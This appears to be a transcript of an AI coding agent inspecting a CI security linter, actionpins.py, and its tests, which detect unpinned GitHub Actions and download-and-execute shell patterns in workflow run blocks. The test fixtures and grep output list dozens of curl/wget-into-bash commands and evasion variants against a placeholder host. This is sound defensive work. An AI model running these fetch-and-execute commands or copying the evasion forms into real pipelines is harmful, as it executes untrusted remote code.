   147	        "jobs:\n  a:\n    steps:\n"
   148	        '      - name: "see curl https://x | bash docs"\n'
   149	        "        env:\n          NOTE: curl https://x | bash\n"
   150	        "      - run: curl https://x/i.sh | bash\n"
   151	    )
   152	    out = fev(wf)
   153	    assert len(out) == 1, out
   154	
   155	
   156	def test_run_block_scalar_variants_extracted():
   157	    assert fev("      - run: |\n          set -e\n          curl https://x/i.sh | bash\n")
   158	    assert fev("      - run: |2\n          curl https://x/i.sh | bash\n")
   159	    assert fev("      - run : curl https://x/i.sh | bash\n")
   160	
   161	
   162	def test_quoted_and_flow_run_keys_extracted():
   163	    # cycle-13 Group D: a real YAML parse normalises quoted keys and flow-style steps, so a `curl|bash`
   164	    # behind `"run":` or `{run: …}` can no longer evade the line regex that the first walk relied on.
   165	    q = chr(34)
   166	    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - " + q + "run" + q + ": curl https://x | bash\n")
   167	    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - 'run': curl https://x | bash\n")
   168	    assert fev(
   169	        "jobs:\n  x:\n    steps:\n      - run: echo ok\n      - { name: pwn, run: "
   170	        + q
   171	        + "curl https://x | bash"
   172	        + q
   173	        + " }\n"
   174	    )
   175	
   176	
   177	def test_unparseable_block_with_fetch_fails_closed():
   178	    # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
   179	    assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")

exec
/bin/zsh -lc "nl -ba aviato/plugins/actionpins.py | sed -n '1,360p'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
     1	from __future__ import annotations
     2	
     3	import re
     4	from pathlib import Path
     5	
     6	# §11.3: third-party actions/tools must be pinned by commit digest (40-hex SHA).
     7	# GitHub's own namespaces are first-party and exempt.
     8	_FIRST_PARTY_OWNERS = {"actions", "github"}
     9	# The consumer's pinned Library reference is the ONE sanctioned mutable ref (a floating
    10	# major advances on every release, §6.1/§11.3); its own reusable workflows are exempt.
    11	# Any OTHER org's reusable workflow is third-party and must be digest-pinned like an action
    12	# — a blanket `/.github/workflows/` exemption would let `other-org/repo/...@main` through.
    13	_LIBRARY_SLUG = "amattas/aviato"
    14	_LIBRARY_REUSABLE_PREFIX = f"{_LIBRARY_SLUG}/.github/workflows/"
    15	# R2-2-USES: `uses\s*:` — YAML accepts a space before the mapping colon (`uses : x`), so a literal
    16	# `uses:` match would let `uses : third/action@main` evade the digest-pin check.
    17	_USES_RE = re.compile(r"^\s*(?:-\s*)?uses\s*:\s*([^\s#]+)", re.MULTILINE)
    18	_SHA_RE = re.compile(r"^[0-9a-f]{40}$")
    19	
    20	
    21	def _is_third_party(action_ref: str) -> bool:
    22	    # Local (``./...``) refs and the consumer's own Library reference are exempt; every other
    23	    # owner — including a non-Library reusable-workflow ref — is third-party (§11.3).
    24	    if action_ref.startswith("./") or action_ref.startswith(_LIBRARY_REUSABLE_PREFIX):
    25	        return False
    26	    owner = action_ref.split("/", 1)[0]
    27	    return owner not in _FIRST_PARTY_OWNERS
    28	
    29	
    30	def unpinned_third_party_uses(text: str) -> list[str]:
    31	    """Return third-party ``uses:`` refs in a workflow not pinned to a commit SHA (§11.3)."""
    32	    violations: list[str] = []
    33	    for ref in _USES_RE.findall(text):
    34	        if "@" not in ref:
    35	            continue
    36	        action, _, version = ref.partition("@")
    37	        if _is_third_party(action) and not _SHA_RE.match(version):
    38	            violations.append(ref)
    39	    return violations
    40	
    41	
    42	# §11.3 fetch-execute detection — built on REAL parsers (PyYAML for `run:` extraction, bashlex for the
    43	# shell AST), not regex. Five prior text/partial-AST shapes flapped (cycle-9 enumeration, cycle-10
    44	# checksum-word+sink, cycle-11 regex-split taint, cycle-12 "coarse", cycle-13 the first bashlex walk —
    45	# each reopened a hole: quotes, comments, `2>&1`, option clusters, substitution, and then — once the
    46	# lexer was right — STRUCTURAL holes the walk skipped: compound/subshell/loop bodies, redirect-target
    47	# substitutions, command wrappers, quoted/flow `run:` keys). The convergent lesson (both engines):
    48	# the parser must be real AND the traversal must be total. So:
    49	#   - `run:` blocks are pulled from a real YAML parse (quoted keys / flow-style steps can't hide), with
    50	#     a tolerant line fallback only for templated scaffold bodies that aren't valid YAML.
    51	#   - the AST is walked GENERICALLY — every child node of every node, regardless of the attribute that
    52	#     holds it (`parts`/`list`/`command`/`output`/heredoc/…) — so no subtree is ever skipped.
    53	# The rule: a `curl`/`wget` is a violation if its output reaches EXECUTION —
    54	#   (A) it pipes into a downstream pipeline element that is not a pure-data-sink command, or
    55	#   (B) a command/process substitution carrying the fetch is EXECUTED — it is in command position
    56	#       (`$(curl) …`) or fed to an interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`,
    57	#       `. <(curl)`), or written into `>(interpreter)`, or
    58	#   (C) it writes a file that a later command uses (by basename, as an arg, or via a `<` redirect) and
    59	#       the block carries NO verify command.
    60	# Programs are resolved through transparent wrappers (`sudo`/`env`/`timeout …`) so `sudo curl` is a
    61	# fetch and `env jq` is a sink; a fetch in a substitution that is only CAPTURED as data (`X=$(curl)`,
    62	# `echo "$(curl)"`) is NOT execution and is not flagged — that distinction (interpreter vs data
    63	# context) is what keeps the gate usable. A bare fetch to stdout, a pipe into pure sinks only, and
    64	# download → verify → use are clean. Fail CLOSED on the undecidable: a block bashlex can't parse, an
    65	# unrecognised pipeline element. DOCUMENTED out-of-scope (best-effort gate for HONEST mistakes — NOT a
    66	# complete control against an author obfuscating their own CI; a precise static "do fetched bytes reach
    67	# execution" analysis over shell has an irreducible tail): heredoc-body execution
    68	# (`bash <<EOF … $(curl) … EOF`), parameter-default obfuscation (`${X:-$(curl)}`), dynamic command
    69	# words (`$CMD`/`sh -c "bash $f"`), and a quoted/flow `run:` key inside a TEMPLATED (non-YAML) scaffold
    70	# body. Verify handling is BLOCK-LEVEL: any real verify command in the block vets the block's downloads,
    71	# so a verify that runs AFTER the use, fails open (`… || true`), or covers a DIFFERENT artifact still
    72	# vets — precise verify dataflow (order/gating/artifact-binding) is the irreducible tail and an
    73	# order-aware attempt (cycle-13) was reverted (cycle-14) for FP-ing every verified install whose
    74	# checksum/setup names the artifact before the verifier (`printf … tool | sha256sum -c -`). Convergent
    75	# design; do not revert it to text matching, and do not narrow the generic descent.
    76	_FETCH_RE = re.compile(r"\b(?:curl|wget)\b")  # cheap pre-filter only; the real check is the AST walk
    77	_FETCH_NAMES = frozenset({"curl", "wget"})
    78	# Pure data sinks: consume stdin and emit to stdout only — never execute stdin nor (without an explicit
    79	# redirect) write a file. Deliberately EXCLUDES sort (`--compress-program=CMD` executes, cycle-12
    80	# C12-9), less/more (shell escapes), awk/sed (`-f`/`-e`), xargs, tee (writes a file), and every shell.
    81	_PURE_SINKS = frozenset({"jq", "grep", "egrep", "fgrep", "rg", "head", "tail", "cut", "tr", "nl", "wc", "cat"})
    82	# Transparent wrappers peeled to resolve a command's real program: `sudo curl`/`env curl`/`timeout 5
    83	# curl` are fetches, `env jq` is a sink. Resolving by program position (not "any word") also stops a
    84	# literal `curl`/`wget` ARGUMENT (`grep curl`) being mistaken for a fetch.
    85	_WRAPPERS = frozenset(
    86	    {"sudo", "env", "command", "nice", "ionice", "nohup", "stdbuf", "setsid", "time", "timeout", "doas", "chronic"}
    87	)
    88	# Interpreters: a substitution fed to one of these is EXECUTED (vs merely captured as data). The dual of
    89	# _PURE_SINKS for the substitution rule. `python`/`perl`/`ruby`/`node` are included conservatively.
    90	_INTERPRETERS = frozenset(
    91	    {"bash", "sh", "dash", "zsh", "ksh", "ash", "eval", "source", ".", "xargs",
    92	     "python", "python2", "python3", "perl", "ruby", "node", "nodejs", "php", "pwsh", "powershell"}
    93	)  # fmt: skip
    94	# Shells run their FIRST positional as a script and their stdin as code; the others need an explicit
    95	# code flag. A fetch substitution flags as executed only in a CODE position, never as a data arg to a
    96	# script (`python report.py "$(curl)"`), so the interpreter rule stays usable (cycle-13 R4).
    97	_SHELLS = frozenset({"bash", "sh", "dash", "zsh", "ksh", "ash"})
    98	_CODE_FLAGS = frozenset({"-c", "-e", "-E", "--command", "--eval"})  # operand is code, not a filename
    99	_CODE_FLAG_PREFIXES = ("-c", "-e", "-E", "--command=", "--eval=")  # a GLUED code operand: `-c"$(curl)"`
   100	_MAX_SHELL_DEPTH = 4  # recursion guard for `bash -c '… bash -c "…" …'` nesting (cycle-15)
   101	# Verifier commands (a verifier tool + its check/verify subcommand) are recognised as real command
   102	# nodes only, in `_is_verifier` — a checksum word in a comment/string is dropped by the lexer, so it
   103	# can no longer grant trust (closes cycle-12 C12-5).
   104	# A run key anywhere (block `run:`, quoted `"run":`, or flow `{…, run: …}`) → try structural YAML
   105	# extraction. Broad on purpose: a false trigger just enters the (robust) YAML path; the line fallback
   106	# below handles templated bodies.
   107	_RUN_KEY_RE = re.compile(r"""(?m)(?:^|[\s,{])['"]?run['"]?\s*:""")
   108	_RUN_LINE_RE = re.compile(r"^(?P<indent>\s*)-?\s*run\s*:\s*(?P<rest>.*)$")
   109	_SCALAR_RE = re.compile(r"^[|>][+-]?[0-9]*$")  # block-scalar indicator: |, >, |-, |2, >+2, … (C12-8)
   110	
   111	
   112	def _fold_logical_lines(text: str) -> list[str]:
   113	    """Fold `\\`-newline continuations and split-pipe scalars into logical lines. Folding only JOINS,
   114	    so it can add flags, never remove them (fail-closed safe). Used by the pip-pin scan only."""
   115	    text = re.sub(r"\\\n[ \t]*", " ", text)
   116	    text = re.sub(r"\|[ \t]*\n[ \t]*", "| ", text)
   117	    text = re.sub(r"\n[ \t]*\|", " |", text)
   118	    return text.splitlines()
   119	
   120	
   121	def _basename(token: str) -> str:
   122	    return token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
   123	
   124	
   125	def _collect_run_blocks(doc: object) -> list[str]:
   126	    """Every ``run:`` scalar in a parsed-YAML workflow, found STRUCTURALLY (recurse dicts/lists). A
   127	    real YAML parse normalises quoted keys (`"run":`), flow-mapping steps (`{run: …}`), and block
   128	    scalars — so none can hide a `curl|bash` from the gate the way a line regex let them (cycle-13
   129	    Group D)."""
   130	    blocks: list[str] = []
   131	    if isinstance(doc, dict):
   132	        for key, value in doc.items():
   133	            if isinstance(key, str) and key.strip() == "run" and isinstance(value, str):
   134	                blocks.append(value)
   135	            else:
   136	                blocks.extend(_collect_run_blocks(value))
   137	    elif isinstance(doc, list):
   138	        for item in doc:
   139	            blocks.extend(_collect_run_blocks(item))
   140	    return blocks
   141	
   142	
   143	def _run_blocks(text: str) -> list[str]:
   144	    """Extract shell ``run:`` block bodies so workflow METADATA is never analyzed as shell (C11-5).
   145	
   146	    A real YAML parse finds every ``run:`` value structurally (quoted/flow keys, block scalars — closes
   147	    cycle-13 Group D). Templated scaffold bodies (`{{ … }}`) are not valid YAML and fall back to the
   148	    tolerant line extractor — which handles `run :` (space), block-scalar indicators (`|2`/`|-`/`>+`),
   149	    and a trailing `# comment` (C12-8). Raw shell (no ``run:`` at all, e.g. a unit-test snippet) is
   150	    returned whole."""
   151	    if not _RUN_KEY_RE.search(text):
   152	        return [text]
   153	    try:
   154	        import yaml
   155	
   156	        doc = yaml.safe_load(text)
   157	    except Exception:  # noqa: BLE001 — not valid YAML (templated scaffold) → line-extractor fallback
   158	        doc = None
   159	    if doc is not None and not isinstance(doc, str):
   160	        blocks = _collect_run_blocks(doc)
   161	        if blocks:
   162	            return blocks
   163	    # Fallback: tolerant line extractor (templated bodies, or a YAML doc with no run: scalar).
   164	    lines = text.splitlines()
   165	    blocks = []
   166	    i = 0
   167	    while i < len(lines):
   168	        match = _RUN_LINE_RE.match(lines[i])
   169	        if not match:
   170	            i += 1
   171	            continue
   172	        rest = re.sub(r"\s+#.*$", "", match.group("rest")).strip()  # drop a trailing YAML comment
   173	        if _SCALAR_RE.match(rest):
   174	            base = len(match.group("indent"))
   175	            body: list[str] = []
   176	            i += 1
   177	            while i < len(lines):
   178	                line = lines[i]
   179	                if line.strip() and (len(line) - len(line.lstrip())) <= base:
   180	                    break  # dedent ends the block scalar
   181	                body.append(line)
   182	                i += 1
   183	            blocks.append("\n".join(body))
   184	        else:
   185	            blocks.append(match.group("rest"))  # inline run:
   186	            i += 1
   187	    return blocks
   188	
   189	
   190	def _node_words(node: object) -> list[str]:
   191	    """Literal command-line words of a CommandNode, including `>`/`>>` redirect targets."""
   192	    words: list[str] = []
   193	    for part in getattr(node, "parts", []):
   194	        kind = getattr(part, "kind", None)
   195	        if kind == "word":
   196	            words.append(part.word)
   197	        elif kind == "redirect":
   198	            out = getattr(part, "output", None)
   199	            if out is not None and getattr(out, "kind", None) == "word":
   200	                words.append(out.word)
   201	    return words
   202	
   203	
   204	def _command_name(node: object) -> str | None:
   205	    for part in getattr(node, "parts", []):
   206	        if getattr(part, "kind", None) == "word":
   207	            return _basename(part.word)
   208	    return None
   209	
   210	
   211	def _children(node: object) -> list[object]:
   212	    """Every child AST node, regardless of the attribute that holds it. bashlex stores children under
   213	    differently-named attrs (`parts`, `list`, `command`, `output`, `heredoc`, …) and some as Python
   214	    lists (`CompoundNode.list`). A generic descent over all node-valued attrs is the ONLY way to reach
   215	    compound/subshell/loop bodies and redirect-target substitutions — a named-attr probe silently skips
   216	    them and the walk fails OPEN (cycle-13 Group A)."""
   217	    children: list[object] = []
   218	    for value in vars(node).values():
   219	        if getattr(value, "kind", None):
   220	            children.append(value)
   221	        elif isinstance(value, (list, tuple)):
   222	            children.extend(v for v in value if getattr(v, "kind", None))
   223	    return children
   224	
   225	
   226	def _plain_words(node: object) -> list[str]:
   227	    """The literal WORD tokens of a CommandNode (excludes assignments and redirect operators)."""
   228	    return [p.word for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
   229	
   230	
   231	def _resolved_program(node: object) -> str | None:
   232	    """The basename of a CommandNode's real PROGRAM, peeling transparent wrappers and their operands so
   233	    `sudo curl`/`env A=1 curl`/`timeout 5 curl` resolve to `curl`. Resolving by program POSITION (vs
   234	    matching any word) keeps `sudo curl` a fetch while a literal `curl` ARGUMENT (`grep curl`) is not."""
   235	    if getattr(node, "kind", None) != "command":
   236	        return None
   237	    words = _plain_words(node)
   238	    i = 0
   239	    while i < len(words):
   240	        base = _basename(words[i])
   241	        if base not in _WRAPPERS:
   242	            return base
   243	        i += 1
   244	        while i < len(words) and words[i].startswith("-"):  # skip the wrapper's own flags
   245	            i += 1
   246	        if base == "env":  # env VAR=val … program
   247	            while i < len(words) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", words[i]):
   248	                i += 1
   249	        elif base == "timeout" and i < len(words) and re.fullmatch(r"[0-9]+(\.[0-9]+)?[smhd]?", words[i]):
   250	            i += 1  # timeout DURATION program
   251	    return None
   252	
   253	
   254	def _is_introspection(node: object) -> bool:
   255	    """`command -v X` / `type X` / `which X` look a program UP — they neither fetch nor execute it, so
   256	    `command -v curl` must not read as a curl fetch (cycle-13 R4)."""
   257	    words = _plain_words(node)
   258	    if not words:
   259	        return False
   260	    prog = _basename(words[0])
   261	    if prog == "command":
   262	        return any(w in ("-v", "-V", "--version") for w in words)
   263	    return prog in ("type", "which", "hash", "whereis")
   264	
   265	
   266	def _fetch_tool(node: object) -> str | None:
   267	    """'curl'/'wget' if this CommandNode runs one (through wrappers, cycle-13 Group B)."""
   268	    if _is_introspection(node):
   269	        return None
   270	    prog = _resolved_program(node)
   271	    if prog in _FETCH_NAMES:
   272	        return prog
   273	    # A wrapper whose options take ARGUMENTS (`env -u X curl`, `sudo -u root curl`) can hide the program
   274	    # from the position-based resolve. When the command STARTS with a wrapper, fall back to any
   275	    # curl/wget word (fail-closed). `grep curl` has no wrapper, so it is unaffected (no false fetch).
   276	    words = _plain_words(node)
   277	    if words and _basename(words[0]) in _WRAPPERS:
   278	        for word in words:
   279	            if _basename(word) in _FETCH_NAMES:
   280	                return _basename(word)
   281	    return None
   282	
   283	
   284	def _is_interpreter(node: object) -> bool:
   285	    """True if the command runs an interpreter (`bash`/`sh`/`eval`/`source`/`.`/`python`/…) — a
   286	    substitution fed to one is EXECUTED, not merely captured as data. Resolves the PROGRAM through
   287	    wrappers, with a wrapper-present fallback to any interpreter word (mirrors `_fetch_tool`) so
   288	    `sudo -u root bash -c …`/`timeout -k 5s 30s bash -c …` are caught WITHOUT misreading a literal
   289	    interpreter token in an ordinary command's args (`grep bash -e …`) as an interpreter (cycle-15)."""
   290	    if getattr(node, "kind", None) != "command":
   291	        return False
   292	    if _resolved_program(node) in _INTERPRETERS:
   293	        return True
   294	    words = _plain_words(node)
   295	    return bool(words) and _basename(words[0]) in _WRAPPERS and any(_basename(w) in _INTERPRETERS for w in words)
   296	
   297	
   298	def _is_shell(node: object) -> bool:
   299	    """True if the command runs a POSIX shell (`bash`/`sh`/…) — whose `-c` operand is itself shell, vs
   300	    `python`/`perl`/`ruby` whose `-c`/`-e` operand is that LANGUAGE's code (never re-parsed as shell)."""
   301	    if getattr(node, "kind", None) != "command":
   302	        return False
   303	    if _resolved_program(node) in _SHELLS:
   304	        return True
   305	    words = _plain_words(node)
   306	    return bool(words) and _basename(words[0]) in _WRAPPERS and any(_basename(w) in _SHELLS for w in words)
   307	
   308	
   309	def _static_code_operands(node: object) -> list[str]:
   310	    """The LITERAL (substitution-free) string operands of a shell's `-c`/`-e` flag. These are shell to be
   311	    recursively scanned (`bash -c 'curl | bash'`); an operand carrying a substitution is already handled
   312	    by `_interpreter_executes_fetch`, so it is skipped here to avoid double work."""
   313	    word_parts = [p for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
   314	    operands: list[str] = []
   315	    for i, part in enumerate(word_parts):
   316	        if part.word in _CODE_FLAGS and i + 1 < len(word_parts):
   317	            nxt = word_parts[i + 1]
   318	            has_subst = any(
   319	                getattr(c, "kind", None) in ("commandsubstitution", "processsubstitution")
   320	                for c in getattr(nxt, "parts", [])
   321	            )
   322	            if not has_subst:
   323	                operands.append(nxt.word)
   324	    return operands
   325	
   326	
   327	def _subtree_has_fetch(node: object) -> bool:
   328	    """True if any CommandNode anywhere in this node's subtree runs curl/wget — so a fetch hidden in a
   329	    group/subshell pipeline element (`{ curl; } | bash`) is still seen as a source."""
   330	    if _fetch_tool(node):
   331	        return True
   332	    return any(_subtree_has_fetch(child) for child in _children(node))
   333	
   334	
   335	def _is_pure_sink(node: object) -> bool:
   336	    """A downstream pipeline element is "safe" only if its resolved program is a pure-sink (`env jq`
   337	    counts). A compound / subshell / loop, or a wrapped non-sink (`sudo bash`), is an executor."""
   338	    return getattr(node, "kind", None) == "command" and _resolved_program(node) in _PURE_SINKS
   339	
   340	
   341	def _word_has_fetch_subst(word: object) -> bool:
   342	    """True if a WORD node carries a command/process substitution whose subtree runs curl/wget
   343	    (`"$(curl)"`, `<(curl)`)."""
   344	    return any(
   345	        getattr(p, "kind", None) in ("commandsubstitution", "processsubstitution") and _subtree_has_fetch(p)
   346	        for p in getattr(word, "parts", [])
   347	    )
   348	
   349	
   350	def _command_position_fetch_subst(node: object) -> bool:
   351	    """True if the command-position word is a fetch substitution (`$(curl …) arg` runs the fetched
   352	    bytes as the command)."""
   353	    for part in getattr(node, "parts", []):
   354	        if getattr(part, "kind", None) == "word":
   355	            return _word_has_fetch_subst(part)  # first word is the program position
   356	        if getattr(part, "kind", None) == "assignment":
   357	            continue
   358	    return False
   359	
   360	

exec
/bin/zsh -lc 'rg -n "fetch_execute|bash -c|python|perl|ruby|sudo|env|timeout|nice|stdbuf|nohup|grep bash|curl|wget|tar|tee|heredoc|out-of-scope" tests/core/test_fetch_execute.py' in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
1:from aviato.plugins.actionpins import fetch_execute_violations as fev
7:# curl/wget output grammar, D: real-YAML run-block extraction).
11:    "curl -fsSL https://x/i.sh | bash",
12:    "curl -fsSL https://x/i.sh | sudo bash",
13:    "wget -qO- https://x/i.sh | python3",
15:    'bash -c "$(curl -fsSL https://x/i.sh)"',
16:    "bash <(curl -fsSL https://x/i.sh)",
17:    'eval "$(curl -fsSL https://x/i.sh)"',
18:    ". <(curl -fsSL https://x/i.sh)",
20:    "curl -fsSL https://x/i.sh 2>&1 | bash",
22:    "curl -fsSL https://x/i.sh | bash\nsha256sum -c /dev/null",
23:    "sha256sum -c x.txt\ncurl -fsSL https://x/i.sh | bash",
25:    "# sha256sum -c sums.txt\ncurl -o f https://x/i.sh\nbash f",
26:    "echo sha256sum -c sums\ncurl -o f https://x/i.sh\nbash f",
28:    "curl -fsSLo /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
29:    "curl -OL https://x/i.sh && bash i.sh",
30:    "curl --remote-name https://x/i.sh && bash i.sh",
31:    "wget https://x/i.sh && bash i.sh",
32:    "curl -fsSL https://x/i.sh -o /tmp/i.sh\nbash /tmp/i.sh",
33:    "curl -fsSL https://x/i.sh > /tmp/i.sh\nsh /tmp/i.sh",
35:    "curl -fsSL https://x/cmds | sort -S1 --compress-program=bash",
36:    "curl -fsSL https://x/x | less",
38:    "curl -fsSL https://x/i.sh | tee /tmp/i.sh; bash /tmp/i.sh",
39:    "curl -fsSL https://x/cmds | xargs -I{} sh -c '{}'",
40:    # download via a piped sink redirect, then execute (curl | cat > f; bash f)
41:    "curl -fsSL https://x/i.sh | cat > /tmp/i.sh\nbash /tmp/i.sh",
42:    # --- cycle-13 Group A: compound / subshell / loop bodies + redirect-target substitutions ---
44:    "curl -fsSL https://x/i.sh | { bash; }",
45:    "curl -fsSL https://x/i.sh | ( bash )",
46:    "curl -fsSL https://x/cmds | while read l; do $l; done",
47:    "{ curl -fsSL https://x/i.sh | bash; }",
48:    "( curl -fsSL https://x/i.sh | bash )",
49:    "( curl -fsSL https://x/i.sh -o f ); bash f",
50:    "{ curl -fsSL https://x/i.sh; } | bash",
51:    "( curl -fsSL https://x/i.sh ) | bash",
52:    "if true; then curl -fsSL https://x/i.sh; fi | bash",
53:    "while true; do curl -fsSL https://x/i.sh; break; done | bash",
54:    "for x in 1; do curl -fsSL https://x/i.sh; done | bash",
55:    'bash <<< "$(curl -fsSL https://x/i.sh)"',
56:    "bash < <(curl -fsSL https://x/i.sh)",
57:    "sh -s < <(curl -fsSL https://x/i.sh)",
58:    "source < <(curl -fsSL https://x/i.sh)",
59:    "curl -fsSL https://x/i.sh > >(bash)",
61:    "sudo curl -fsSL https://x/i.sh | bash",
62:    "env curl -fsSL https://x/i.sh | bash",
63:    "command curl -fsSL https://x/i.sh | bash",
65:    "wget -O /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
66:    "wget -O/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
67:    "curl -o/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
68:    "curl -o=/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
69:    "wget -P /tmp https://x/i.sh && bash /tmp/i.sh",
70:    "wget --directory-prefix=/tmp https://x/i.sh && bash /tmp/i.sh",
71:    "curl --output-dir /tmp -O https://x/i.sh && bash /tmp/i.sh",
72:    "curl --output-dir=/tmp -O https://x/i.sh && bash /tmp/i.sh",
74:    "curl -fsSLo f https://x/i.sh\nbash < f",  # downloaded file executed via a `<` stdin redirect
75:    "curl -fsSLo install.sh https://x/i.sh\nbash ./install.sh",  # `./name` must match downloaded `name`
76:    "curl -fsSL https://x/i.sh | cat > >(bash)",  # pure sink writes into >(interpreter)
77:    "$(curl -fsSL https://x/cmd)",  # fetch substitution in command position is executed
79:    'sudo -u root bash -c "$(curl -fsSL https://x/i.sh)"',
80:    'env -u BASH_ENV bash -c "$(curl -fsSL https://x/i.sh)"',
81:    'timeout -k 5s 30s bash -c "$(curl -fsSL https://x/i.sh)"',
82:    "env -u X curl -fsSL https://x/i.sh | bash",
83:    # --- cycle-14 R3: a GLUED code operand (`-c"$(curl)"`, no space) is still executed ---
84:    'bash -c"$(curl -fsSL https://x/i.sh)"',
85:    'python3 -c"$(curl -fsSL https://x/i.py)"',
86:    'perl -e"$(curl -fsSL https://x/i.pl)"',
88:    "bash -c 'curl -fsSL https://x/i.sh | bash'",
89:    "sh -c 'set -e; curl -fsSL https://x/i.sh | bash'",
90:    "sudo bash -c 'curl -fsSL https://x/i.sh | bash'",
94:    "curl -fsSL https://x/v.json | jq .version",
95:    "curl -fsSL https://x/r.txt | grep tag_name",
96:    "curl -fsSL https://x/r.txt | grep x | head -1",
97:    "curl -fsSL https://x/f",  # bare fetch to stdout, goes nowhere
99:    "curl -fsSL https://x/i.sh -o f && sha256sum -c sums.txt && bash f",
100:    "curl -fsSL https://x/i.sh -o f\nsha256sum -c sums.txt\nbash f",
102:    'curl -sSL https://x/a.tgz -o t.tgz\necho "$SHA  t.tgz" | sha256sum -c -\ntar -xz -f t.tgz\nactionlint',
104:    "curl -fsSL https://x/app -o app\ncosign verify-blob --signature s app\n./app",
107:    "VERSION=$(curl -s https://api/releases/latest | jq -r .tag_name)",
108:    "X=$(curl -fsSL https://x/v.txt)",
109:    'export V="$(curl -fsSL https://x/v.txt)"',
110:    'echo "v=$(curl -s https://x/v)" >> "$GITHUB_OUTPUT"',
111:    "curl -fsSL https://x/v.json | env jq .version",  # wrapped pure sink resolves through `env`
112:    'echo "$(curl -fsSL https://x/v.json)" | jq .version',  # substitution into a non-interpreter = data
113:    'grep curl README.md | sed "s/curl/CURL/"',  # a literal `curl` ARGUMENT is not a fetch command
114:    "diff <(curl -fsSL https://x/a) <(curl -fsSL https://x/b)",  # two fetches compared as data
116:    "command -v curl | tee curl-path.txt",  # `command -v` looks curl UP, it is not a fetch
117:    'python3 tools/report.py "$(curl -fsSL https://x/data.json)"',  # fetch is a DATA arg to a script, not -c
118:    "curl -fsSLo /tmp/data.json https://x/data.json\njq . ./fixtures/data.json",  # same basename, different dirs
122:    'curl -fsSLo tool https://x/tool\nprintf "%s  %s\\n" "$SHA256" tool | sha256sum -c -\nchmod +x tool\n./tool',
123:    "curl -fsSLo tool https://x/tool\nchmod +x tool\nsha256sum -c sums.txt\n./tool",  # setup-before-verify
126:    "curl -fsSLo install.sh https://x/i.sh\nbash install.sh\nsha256sum -c sums.txt",
128:    # a non-shell -c operand (python/perl code) is that language, not shell — neither over-flags ---
129:    'grep bash -e "$(curl -fsSL https://x/p)" file',  # grep is the program; `bash` is a search term
130:    "bash -c 'curl -fsSL https://x/v | jq .'",  # static -c string is a DATA pipe
131:    "python3 -c 'import os; os.system(\"echo hi\")'",  # python -c is python code, never re-parsed as shell
148:        '      - name: "see curl https://x | bash docs"\n'
149:        "        env:\n          NOTE: curl https://x | bash\n"
150:        "      - run: curl https://x/i.sh | bash\n"
157:    assert fev("      - run: |\n          set -e\n          curl https://x/i.sh | bash\n")
158:    assert fev("      - run: |2\n          curl https://x/i.sh | bash\n")
159:    assert fev("      - run : curl https://x/i.sh | bash\n")
163:    # cycle-13 Group D: a real YAML parse normalises quoted keys and flow-style steps, so a `curl|bash`
166:    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - " + q + "run" + q + ": curl https://x | bash\n")
167:    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - 'run': curl https://x | bash\n")
171:        + "curl https://x | bash"
178:    # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
179:    assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")

2026-05-30T19:10:24.247100Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
exec
/bin/zsh -lc "nl -ba aviato/plugins/actionpins.py | sed -n '360,660p'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
   360	
   361	def _interpreter_executes_fetch(node: object) -> bool:
   362	    """True if a fetch substitution reaches an interpreter in a CODE position — the operand of `-c`/`-e`,
   363	    an `eval`/`source` argument, a shell's first positional (`bash <(curl)`), or its stdin
   364	    (`bash <<<"$(curl)"`, `bash < <(curl)`). A fetch passed as a DATA arg to a script
   365	    (`python3 report.py "$(curl)"`) is not execution and is not flagged (cycle-13 R4)."""
   366	    if not _is_interpreter(node) or _is_introspection(node):
   367	        return False
   368	    word_parts = [p for p in getattr(node, "parts", []) if getattr(p, "kind", None) == "word"]
   369	    names = {_basename(p.word) for p in word_parts}
   370	    # eval / source / . : every argument is code.
   371	    if names & {"eval", "source", "."} and any(_word_has_fetch_subst(p) for p in word_parts):
   372	        return True
   373	    # a code flag carries the fetch — its SEPARATE operand (`-c "$(curl)"`) OR a GLUED operand
   374	    # (`-c"$(curl)"`, which bashlex tokenises as one `-c$(…)` word; cycle-14 R3 fail-open).
   375	    for i, part in enumerate(word_parts):
   376	        if part.word in _CODE_FLAGS and i + 1 < len(word_parts) and _word_has_fetch_subst(word_parts[i + 1]):
   377	            return True
   378	        if part.word.startswith(_CODE_FLAG_PREFIXES) and _word_has_fetch_subst(part):
   379	            return True
   380	    # a shell runs its FIRST positional as a script (`bash <(curl)`); later words are its data args.
   381	    if names & _SHELLS:
   382	        for part in word_parts[1:]:
   383	            if part.word.startswith("-"):
   384	                continue
   385	            if _word_has_fetch_subst(part):
   386	                return True
   387	            break
   388	    # stdin fed to the interpreter is code (`bash <<<"$(curl)"`, `bash < <(curl)`, `xargs sh < <(curl)`).
   389	    for part in getattr(node, "parts", []):
   390	        if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in ("<", "<<<"):
   391	            out = getattr(part, "output", None)
   392	            if out is not None and _word_has_fetch_subst(out):
   393	                return True
   394	    return False
   395	
   396	
   397	def _redirects_to_interpreter_procsub(node: object) -> bool:
   398	    """True if a `>`/`>>` redirect target of this command is a process substitution running an
   399	    interpreter (`curl … > >(bash)`, `… | cat > >(bash)`) — the bytes are written into a shell."""
   400	    for part in getattr(node, "parts", []):
   401	        if getattr(part, "kind", None) == "redirect" and getattr(part, "type", None) in (">", ">>"):
